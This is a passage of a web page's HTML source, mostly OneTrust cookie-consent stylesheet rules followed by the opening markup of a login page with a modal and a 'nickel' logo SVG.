        #onetrust-pc-sdk .ot-enbl-chr h4~.ot-tgl,
        #onetrust-pc-sdk .ot-enbl-chr h4~.ot-always-active {
            right: 45px
        }

        #onetrust-pc-sdk .ot-enbl-chr h4~.ot-tgl+.ot-tgl {
            right: 120px
        }

        #onetrust-pc-sdk .ot-enbl-chr .ot-pli-hdr.ot-leg-border-color span:first-child {
            width: 90px
        }

        #onetrust-pc-sdk .ot-enbl-chr li.ot-subgrp>h5+.ot-tgl-cntr {
            padding-right: 25px
        }

        #onetrust-pc-sdk .ot-plus-minus {
            width: 20px;
            height: 20px;
            font-size: 1.5em;
            position: relative;
            display: inline-block;
            margin-right: 5px;
            top: 3px
        }

        #onetrust-pc-sdk .ot-plus-minus span {
            position: absolute;
            background: #27455c;
            border-radius: 1px
        }

        #onetrust-pc-sdk .ot-plus-minus span:first-of-type {
            top: 25%;
            bottom: 25%;
            width: 10%;
            left: 45%
        }

        #onetrust-pc-sdk .ot-plus-minus span:last-of-type {
            left: 25%;
            right: 25%;
            height: 10%;
            top: 45%
        }

        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:first-of-type,
        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:last-of-type {
            transform: rotate(90deg)
        }

        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:last-of-type {
            left: 50%;
            right: 50%
        }

        #onetrust-pc-sdk #ot-selall-vencntr label,
        #onetrust-pc-sdk #ot-selall-adtlvencntr label,
        #onetrust-pc-sdk #ot-selall-hostcntr label,
        #onetrust-pc-sdk #ot-selall-licntr label {
            position: relative;
            display: inline-block;
            width: 20px;
            height: 20px
        }

        #onetrust-pc-sdk .ot-host-item .ot-plus-minus,
        #onetrust-pc-sdk .ot-ven-item .ot-plus-minus {
            float: left;
            margin-right: 8px;
            top: 10px
        }

        #onetrust-pc-sdk .ot-pli-hdr {
            color: #77808e;
            overflow: hidden;
            padding-top: 7.5px;
            padding-bottom: 7.5px;
            width: calc(100% - 2px);
            border-top-left-radius: 3px;
            border-top-right-radius: 3px
        }

        #onetrust-pc-sdk .ot-pli-hdr span:first-child {
            top: 50%;
            transform: translateY(50%);
            max-width: 90px
        }

        #onetrust-pc-sdk .ot-pli-hdr span:last-child {
            padding-right: 10px;
            max-width: 95px;
            text-align: center
        }

        #onetrust-pc-sdk .ot-li-title {
            float: right;
            font-size: .813em
        }

        #onetrust-pc-sdk .ot-pli-hdr.ot-leg-border-color {
            background-color: #f4f4f4;
            border: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk .ot-pli-hdr.ot-leg-border-color span:first-child {
            text-align: left;
            width: 70px
        }

        #onetrust-pc-sdk li.ot-subgrp>h5,
        #onetrust-pc-sdk .ot-cat-header {
            width: calc(100% - 130px)
        }

        #onetrust-pc-sdk li.ot-subgrp>h5+.ot-tgl-cntr {
            padding-left: 13px
        }

        #onetrust-pc-sdk .ot-acc-grpcntr .ot-acc-grpdesc {
            margin-bottom: 5px
        }

        #onetrust-pc-sdk .ot-acc-grpcntr .ot-subgrp-cntr {
            border-top: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk .ot-acc-grpcntr .ot-vlst-cntr+.ot-subgrp-cntr {
            border-top: none
        }

        #onetrust-pc-sdk .ot-acc-hdr .ot-arw-cntr+.ot-tgl-cntr,
        #onetrust-pc-sdk .ot-acc-txt h4+.ot-tgl-cntr {
            padding-left: 13px
        }

        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-subgrp>h5,
        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-cat-header {
            width: calc(100% - 145px)
        }

        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item h5+.ot-tgl-cntr,
        #onetrust-pc-sdk .ot-pli-hdr~.ot-cat-item .ot-cat-header+.ot-tgl {
            padding-left: 28px
        }

        #onetrust-pc-sdk .ot-sel-all-hdr,
        #onetrust-pc-sdk .ot-sel-all-chkbox {
            display: inline-block;
            width: 100%;
            position: relative
        }

        #onetrust-pc-sdk .ot-sel-all-chkbox {
            z-index: 1
        }

        #onetrust-pc-sdk .ot-sel-all {
            margin: 0;
            position: relative;
            padding-right: 23px;
            float: right
        }

        #onetrust-pc-sdk .ot-consent-hdr,
        #onetrust-pc-sdk .ot-li-hdr {
            float: right;
            font-size: .812em;
            line-height: normal;
            text-align: center;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-li-hdr {
            max-width: 100px;
            padding-right: 10px
        }

        #onetrust-pc-sdk .ot-consent-hdr {
            max-width: 55px
        }

        #onetrust-pc-sdk #ot-selall-licntr {
            display: block;
            width: 21px;
            height: auto;
            float: right;
            position: relative;
            right: 80px
        }

        #onetrust-pc-sdk #ot-selall-licntr label {
            position: absolute
        }

        #onetrust-pc-sdk .ot-ven-ctgl {
            margin-left: 66px
        }

        #onetrust-pc-sdk .ot-ven-litgl+.ot-arw-cntr {
            margin-left: 81px
        }

        #onetrust-pc-sdk .ot-enbl-chr .ot-host-cnt .ot-tgl-cntr {
            width: auto
        }

        #onetrust-pc-sdk #ot-lst-cnt:not(.ot-host-cnt) .ot-tgl-cntr {
            width: auto;
            top: auto;
            height: 20px
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-chkbox {
            position: relative;
            display: inline-block;
            width: 20px;
            height: 20px
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-chkbox label {
            position: absolute;
            padding: 0;
            width: 20px;
            height: 20px
        }

        #onetrust-pc-sdk .ot-acc-grpdesc+.ot-leg-btn-container {
            padding-left: 20px;
            padding-right: 20px;
            width: calc(100% - 40px);
            margin-bottom: 5px
        }

        #onetrust-pc-sdk .ot-subgrp .ot-leg-btn-container {
            margin-bottom: 5px
        }

        #onetrust-pc-sdk #ot-ven-lst .ot-leg-btn-container {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-leg-btn-container {
            display: inline-block;
            width: 100%;
            margin-bottom: 10px
        }

        #onetrust-pc-sdk .ot-leg-btn-container button {
            height: auto;
            padding: 6.5px 8px;
            margin-bottom: 0;
            letter-spacing: 0;
            font-size: .75em;
            line-height: normal
        }

        #onetrust-pc-sdk .ot-leg-btn-container svg {
            display: none;
            height: 14px;
            width: 14px;
            padding-right: 5px;
            vertical-align: sub
        }

        #onetrust-pc-sdk .ot-active-leg-btn {
            cursor: default;
            pointer-events: none
        }

        #onetrust-pc-sdk .ot-active-leg-btn svg {
            display: inline-block
        }

        #onetrust-pc-sdk .ot-remove-objection-handler {
            text-decoration: underline;
            padding: 0;
            font-size: .75em;
            font-weight: 600;
            line-height: 1;
            padding-left: 10px
        }

        #onetrust-pc-sdk .ot-obj-leg-btn-handler span {
            font-weight: bold;
            text-align: center;
            font-size: inherit;
            line-height: 1.5
        }

        #onetrust-pc-sdk.ot-close-btn-link #close-pc-btn-handler {
            border: none;
            height: auto;
            line-height: 1.5;
            text-decoration: underline;
            font-size: .69em;
            background: none;
            right: 15px;
            top: 15px;
            width: auto;
            font-weight: normal
        }

        #onetrust-pc-sdk[dir=rtl] #ot-back-arw,
        #onetrust-pc-sdk[dir=rtl] input~.ot-acc-hdr .ot-arw {
            transform: rotate(180deg);
            -o-transform: rotate(180deg);
            -ms-transform: rotate(180deg);
            -webkit-transform: rotate(180deg)
        }

        #onetrust-pc-sdk[dir=rtl] input:checked~.ot-acc-hdr .ot-arw {
            transform: rotate(270deg);
            -o-transform: rotate(270deg);
            -ms-transform: rotate(270deg);
            -webkit-transform: rotate(270deg)
        }

        #onetrust-pc-sdk[dir=rtl] .ot-chkbox label::after {
            transform: rotate(45deg);
            -webkit-transform: rotate(45deg);
            -o-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
            border-left: 0;
            border-right: 3px solid
        }

        #onetrust-pc-sdk[dir=rtl] .ot-search-cntr>svg {
            right: 0
        }

        @media only screen and (max-width: 600px) {
            #onetrust-pc-sdk.otPcCenter {
                left: 0;
                min-width: 100%;
                height: 100%;
                top: 0;
                border-radius: 0
            }

            #onetrust-pc-sdk #ot-pc-content,
            #onetrust-pc-sdk.ot-ftr-stacked .ot-btn-container {
                margin: 1px 3px 0 10px;
                padding-right: 10px;
                width: calc(100% - 23px)
            }

            #onetrust-pc-sdk .ot-btn-container button {
                max-width: none;
                letter-spacing: .01em
            }

            #onetrust-pc-sdk #close-pc-btn-handler {
                top: 10px;
                right: 17px
            }

            #onetrust-pc-sdk p {
                font-size: .7em
            }

            #onetrust-pc-sdk #ot-pc-hdr {
                margin: 10px 10px 0 5px;
                width: calc(100% - 15px)
            }

            #onetrust-pc-sdk .vendor-search-handler {
                font-size: 1em
            }

            #onetrust-pc-sdk #ot-back-arw {
                margin-left: 12px
            }

            #onetrust-pc-sdk #ot-lst-cnt {
                margin: 0;
                padding: 0 5px 0 10px;
                min-width: 95%
            }

            #onetrust-pc-sdk .switch+p {
                max-width: 80%
            }

            #onetrust-pc-sdk .ot-ftr-stacked button {
                width: 100%
            }

            #onetrust-pc-sdk #ot-fltr-cnt {
                max-width: 320px;
                width: 90%;
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
                margin: 0;
                margin-left: 15px;
                left: auto;
                right: 40px;
                top: 85px
            }

            #onetrust-pc-sdk .ot-fltr-opt {
                margin-left: 25px;
                margin-bottom: 10px
            }

            #onetrust-pc-sdk .ot-pc-refuse-all-handler {
                margin-bottom: 0
            }

            #onetrust-pc-sdk #ot-fltr-cnt {
                right: 40px
            }
        }

        @media only screen and (max-width: 476px) {

            #onetrust-pc-sdk .ot-fltr-cntr,
            #onetrust-pc-sdk #ot-fltr-cnt {
                right: 10px
            }

            #onetrust-pc-sdk #ot-anchor {
                right: 25px
            }

            #onetrust-pc-sdk button {
                width: 100%
            }

            #onetrust-pc-sdk:not(.ot-addtl-vendors) #ot-pc-lst:not(.ot-enbl-chr) .ot-sel-all {
                padding-right: 9px
            }

            #onetrust-pc-sdk:not(.ot-addtl-vendors) #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr {
                right: 0
            }
        }

        @media only screen and (max-width: 896px)and (max-height: 425px)and (orientation: landscape) {
            #onetrust-pc-sdk.otPcCenter {
                left: 0;
                top: 0;
                min-width: 100%;
                height: 100%;
                border-radius: 0
            }

            #onetrust-pc-sdk #ot-anchor {
                left: initial;
                right: 50px
            }

            #onetrust-pc-sdk #ot-lst-title {
                margin-top: 12px
            }

            #onetrust-pc-sdk #ot-lst-title * {
                font-size: inherit
            }

            #onetrust-pc-sdk #ot-pc-hdr input {
                margin-right: 0;
                padding-right: 45px
            }

            #onetrust-pc-sdk .switch+p {
                max-width: 85%
            }

            #onetrust-pc-sdk #ot-sel-blk {
                position: static
            }

            #onetrust-pc-sdk #ot-pc-lst {
                overflow: auto
            }

            #onetrust-pc-sdk .ot-pc-footer-logo {
                display: none
            }

            #onetrust-pc-sdk #ot-lst-cnt {
                max-height: none;
                overflow: initial
            }

            #onetrust-pc-sdk #ot-lst-cnt.no-results {
                height: auto
            }

            #onetrust-pc-sdk input {
                font-size: 1em !important
            }

            #onetrust-pc-sdk p {
                font-size: .6em
            }

            #onetrust-pc-sdk #ot-fltr-modal {
                width: 100%;
                top: 0
            }

            #onetrust-pc-sdk ul li p,
            #onetrust-pc-sdk .category-vendors-list-handler,
            #onetrust-pc-sdk .category-vendors-list-handler+a,
            #onetrust-pc-sdk .category-host-list-handler {
                font-size: .6em
            }

            #onetrust-pc-sdk.ot-shw-fltr #ot-anchor {
                display: none !important
            }

            #onetrust-pc-sdk.ot-shw-fltr #ot-pc-lst {
                height: 100% !important;
                overflow: hidden;
                top: 0px
            }

            #onetrust-pc-sdk.ot-shw-fltr #ot-fltr-cnt {
                margin: 0;
                height: 100%;
                max-height: none;
                padding: 10px;
                top: 0;
                width: calc(100% - 20px);
                position: absolute;
                right: 0;
                left: 0;
                max-width: none
            }

            #onetrust-pc-sdk.ot-shw-fltr .ot-fltr-scrlcnt {
                max-height: calc(100% - 65px)
            }
        }

        #onetrust-consent-sdk #onetrust-pc-sdk,
        #onetrust-consent-sdk #ot-search-cntr,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-switch.ot-toggle,
        #onetrust-consent-sdk #onetrust-pc-sdk ot-grp-hdr1 .checkbox,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title:after,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-sel-blk,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-cnt,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-anchor {
            background-color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk h3,
        #onetrust-consent-sdk #onetrust-pc-sdk h4,
        #onetrust-consent-sdk #onetrust-pc-sdk h5,
        #onetrust-consent-sdk #onetrust-pc-sdk h6,
        #onetrust-consent-sdk #onetrust-pc-sdk p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-ven-lst .ot-ven-opts p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-desc,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-title,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-li-title,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-sel-all-hdr span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-fltr-modal #modal-header,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-checkbox label span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-sel-blk p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-lst-title span,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .back-btn-handler p,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst .ot-ven-name,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-pc-lst #ot-ven-lst .consent-category,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-label-status,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-chkbox label span,
        #onetrust-consent-sdk #onetrust-pc-sdk #clear-filters-handler {
            color: #696969;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .privacy-notice-link,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler+a,
        #onetrust-consent-sdk #onetrust-pc-sdk .category-host-list-handler,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-ven-link,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-name a,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-acc-hdr .ot-host-expand,
        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info a {
            color: #b0b0b0;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .category-vendors-list-handler:hover {
            opacity: .7;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-grpcntr.ot-acc-txt,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-subgrp-tgl .ot-switch.ot-toggle {
            background-color: #F8F8F8;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk #ot-host-lst .ot-host-info,
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-acc-txt .ot-ven-dets {
            background-color: #F8F8F8;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk button:not(#clear-filters-handler):not(.ot-close-icon):not(#filter-btn-handler):not(.ot-remove-objection-handler):not(.ot-obj-leg-btn-handler):not([aria-expanded]):not(.ot-link-btn),
        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-active-leg-btn {
            background-color: #FF5F00;
            border-color: #FF5F00;
            color: #FFFFFF;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-active-menu {
            border-color: #FF5F00;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-remove-objection-handler {
            background-color: transparent;
            border: 1px solid transparent;
        }

        #onetrust-consent-sdk #onetrust-pc-sdk .ot-leg-btn-container .ot-inactive-leg-btn {
            background-color: #FFFFFF;
            color: #78808E;
            border-color: #78808E;
        }

        .ot-sdk-cookie-policy {
            font-family: inherit;
            font-size: 16px
        }

        .ot-sdk-cookie-policy.otRelFont {
            font-size: 1rem
        }

        .ot-sdk-cookie-policy h3,
        .ot-sdk-cookie-policy h4,
        .ot-sdk-cookie-policy h6,
        .ot-sdk-cookie-policy p,
        .ot-sdk-cookie-policy li,
        .ot-sdk-cookie-policy a,
        .ot-sdk-cookie-policy th,
        .ot-sdk-cookie-policy #cookie-policy-description,
        .ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
        .ot-sdk-cookie-policy #cookie-policy-title {
            color: dimgray
        }

        .ot-sdk-cookie-policy #cookie-policy-description {
            margin-bottom: 1em
        }

        .ot-sdk-cookie-policy h4 {
            font-size: 1.2em
        }

        .ot-sdk-cookie-policy h6 {
            font-size: 1em;
            margin-top: 2em
        }

        .ot-sdk-cookie-policy th {
            min-width: 75px
        }

        .ot-sdk-cookie-policy a,
        .ot-sdk-cookie-policy a:hover {
            background: #fff
        }

        .ot-sdk-cookie-policy thead {
            background-color: #f6f6f4;
            font-weight: bold
        }

        .ot-sdk-cookie-policy .ot-mobile-border {
            display: none
        }

        .ot-sdk-cookie-policy section {
            margin-bottom: 2em
        }

        .ot-sdk-cookie-policy table {
            border-collapse: inherit
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy {
            font-family: inherit;
            font-size: 1rem
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
            color: dimgray
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
            margin-bottom: 1em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup {
            margin-left: 1.5em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group-desc,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-table-header,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td {
            font-size: .9em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td a {
            font-size: inherit
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
            font-size: 1em;
            margin-bottom: .6em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-title {
            margin-bottom: 1.2em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy>section {
            margin-bottom: 1em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
            min-width: 75px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a:hover {
            background: #fff
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead {
            background-color: #f6f6f4;
            font-weight: bold
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-mobile-border {
            display: none
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy section {
            margin-bottom: 2em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li {
            list-style: disc;
            margin-left: 1.5em
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-subgroup ul li h4 {
            display: inline-block
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
            border-collapse: inherit;
            margin: auto;
            border: 1px solid #d7d7d7;
            border-radius: 5px;
            border-spacing: initial;
            width: 100%;
            overflow: hidden
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
            border-bottom: 1px solid #d7d7d7;
            border-right: 1px solid #d7d7d7
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
            border-bottom: 0px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr th:last-child,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr td:last-child {
            border-right: 0px
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
            width: 25%
        }

        .ot-sdk-cookie-policy[dir=rtl] {
            text-align: left
        }

        #ot-sdk-cookie-policy h3 {
            font-size: 1.5em
        }

        @media only screen and (max-width: 530px) {

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) table,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tbody,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) th,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td,
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
                display: block
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) thead tr {
                position: absolute;
                top: -9999px;
                left: -9999px
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr {
                margin: 0 0 1em 0
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd),
            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) tr:nth-child(odd) a {
                background: #f6f6f4
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td {
                border: none;
                border-bottom: 1px solid #eee;
                position: relative;
                padding-left: 50%
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
                position: absolute;
                height: 100%;
                left: 6px;
                width: 40%;
                padding-right: 10px
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) .ot-mobile-border {
                display: inline-block;
                background-color: #e4e4e4;
                position: absolute;
                height: 100%;
                top: 0;
                left: 45%;
                width: 2px
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) td:before {
                content: attr(data-label);
                font-weight: bold
            }

            .ot-sdk-cookie-policy:not(#ot-sdk-cookie-policy-v2) li {
                word-break: break-word;
                word-wrap: break-word
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table {
                overflow: hidden
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table td {
                border: none;
                border-bottom: 1px solid #d7d7d7
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tbody,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
                display: block
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-host,
            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table .ot-cookies-type {
                width: auto
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy tr {
                margin: 0 0 1em 0
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
                height: 100%;
                width: 40%;
                padding-right: 10px
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td:before {
                content: attr(data-label);
                font-weight: bold
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li {
                word-break: break-word;
                word-wrap: break-word
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy thead tr {
                position: absolute;
                top: -9999px;
                left: -9999px;
                z-index: -9999
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td {
                border-bottom: 1px solid #d7d7d7;
                border-right: 0px
            }

            #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table tr:last-child td:last-child {
                border-bottom: 0px
            }
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy td,
        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-description {
            color: #696969;
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy th {
            color: #696969;
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy .ot-sdk-cookie-policy-group {
            color: #696969;
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy #cookie-policy-title {
            color: #696969;
        }

        #ot-sdk-cookie-policy-v2.ot-sdk-cookie-policy table th {
            background-color: #F8F8F8;
        }
    </style>
</head>

<body>
    <div id="root">
        <div class="sc-jVSGNQ hzsGOz">
            <div class="Toastify"></div>
        </div>
        <div class="sc-fyjqAk jphalT"></div>
        <div class="sc-iXeHaJ jTuJp">
            <div class="sc-hYRTwp iRaesw">
                <div data-testid="Modal#Title" class="sc-jLqRGG bcRTMJ"></div>
            </div>
            <div data-testid="Modal#Content" class="sc-bUQyIj exIfBg">
                <p data-testid="ModelText"></p>
            </div>
            <div class="sc-tsGVs liNYvh">
                <div class="sc-jhGUec boJzWi sc-bShgHC fjLQwb sc-eiQWpL koCxyi"><button type="button" data-testid="ModalPrimary#Btn"></button></div>
                <div class="sc-jhGUec boJzWi sc-ecQkzk sc-hYIrvc efLGEG fkDYQI sc-eiQWpL koCxyi"><button type="button" data-testid="ModalSecondary#Btn"></button></div>
            </div>
        </div>
        <div class="MuiGrid-root ec-authentication-grid MuiGrid-container">
            <div class="MuiGrid-root brand-side MuiGrid-item MuiGrid-grid-xs-12 MuiGrid-grid-lg-6">
                <header>
                    <div class="logo"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="1em" height="1em" class="sc-gIvpjk dVRMhB icon-nickel-logo" css="">
                            <path d="M719.3 444.3H304.8c-40.1 0-72.5 32-72.5 72.1 0 39.8 32.5 71.9 72.5 71.9h414.6c39.9 0 72.5-32.1 72.5-71.9-.1-40.1-32.7-72.1-72.6-72.1zM512 144.8c40 0 72.5-32.3 72.5-72.3C584.4 32.7 551.9 0 512 0s-72.4 32.7-72.4 72.5c0 40 32.5 72.3 72.4 72.3zM606.2 660.4H418c-39.7 0-72.3 32-72.3 71.8s32.4 72.3 72.1 72.3H606l.2.4c39.8 0 72.1-32.4 72.1-72.2.1-39.7-32.2-72.3-72.1-72.3zM606.2 224H418c-39.7 0-72.3 32-72.3 71.7 0 40 32.4 72.3 72.1 72.3H606l.2.1c39.8 0 72.1-32.2 72.1-72 .1-39.7-32.2-72.1-72.1-72.1zM512 879.1c-39.9 0-72.4 32.6-72.4 72.5 0 40 32.6 72.4 72.4 72.4 40 0 72.5-32.4 72.5-72.4-.1-39.9-32.6-72.5-72.5-72.5z">
                            </path>
                        </svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="1em" height="1em" class="sc-fHCHyC crlswz icon-nickel" css="">
